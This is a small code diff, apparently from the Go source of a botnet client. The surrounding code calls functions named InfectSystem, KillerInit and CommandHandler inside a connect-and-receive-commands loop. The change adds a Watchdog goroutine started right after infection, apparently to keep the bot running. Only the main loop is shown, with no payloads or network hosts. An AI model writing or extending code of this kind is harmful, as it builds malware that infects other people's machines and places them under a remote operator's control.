@@ -74,6 +74,8 @@ func main() {
 
 		InfectSystem()
 
+		go Watchdog()
+
 		if config.KILLER_ENABLED {
 			go KillerInit()
 		}
@@ -150,6 +152,7 @@ CONNECT:
 			}
 			continue
 		}
+
 		CommandHandler(cmd)
 	}
 }
